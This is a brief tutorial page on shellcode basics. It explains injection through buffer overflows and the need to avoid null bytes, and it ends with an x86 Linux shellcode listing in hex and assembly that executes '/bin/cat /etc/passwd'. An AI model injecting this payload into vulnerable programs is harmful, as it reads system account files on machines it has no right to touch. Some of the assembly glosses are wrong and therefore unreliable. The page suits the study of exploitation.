<h1>Shellcode Basic</h1>
<hr>
<p>Shellcode is machine code that when executed spawns a shell Not all "Shellcode" spawns a shell.Shellcode is a list of machine code instructions which are developed in a manner that allows it to be injected in a vulnerable application during its runtime.Injecting Shellcode in an application is done by exploiting various security holes in an application like buffer overflows, which are the most popular ones.You cannot access any values through static addresses because these addresses will not be static in the program that is executing your Shellcode. But this is not applicable to environment variable.While creating a shell code always use the smallest part of a register to avoid null string.A Shellcode must not contain null string since null string is a delimiter.Anything after null string is ignored during execution.That’s a brief about
Shellcode</p>
<b>Methods for generating Shellcode<b/>
<li>1. Write the shellcode  directly in hex code.</li>
<li>2.Write the assembly instructions, and then extract the opcodes to generate the shellcode.</li>
<li>3. Write in C, extract assembly instructions and then  the opcodes and finally generate the shellcode.</li>

<b>Hex-Opcodes             Assembly instruction</b>
<ul>
"\x31\xc0"                                           xorl    %eax,%eax       
  "\x99"                                            cdq== movl eax edx  
  "\x52"                                              push edx                    
  "\x68\x2f\x63\x61\x74"                pushl 0x7461632f 
 "\x68\x2f\x62\x69\x6e"                pushl 0x6e69622f 
 "\x89\xe3"                                         mov ebx,esp   
 "\x52"                                             push edx      
"\x68\x73\x73\x77\x64"                  pushl 0x64777373  
"\x68\x2f\x2f\x70\x61"                pushl  0x61702f2f  
"\x68\x2f\x65\x74\x63"               pushl 0x6374652f 
"\x89\xe1"                                       mov ecx,esp  
"\xb0\x0b"                                     mov  $0xb,%al                              
"\x52"                                             push edx 
"\x51"                                              push ecx 
"\x53"                                             push ebx 
"\x89\xe1"                                      mov ecx,esp   
 "\xcd\x80" ;                                    int 80h    
    </ul>
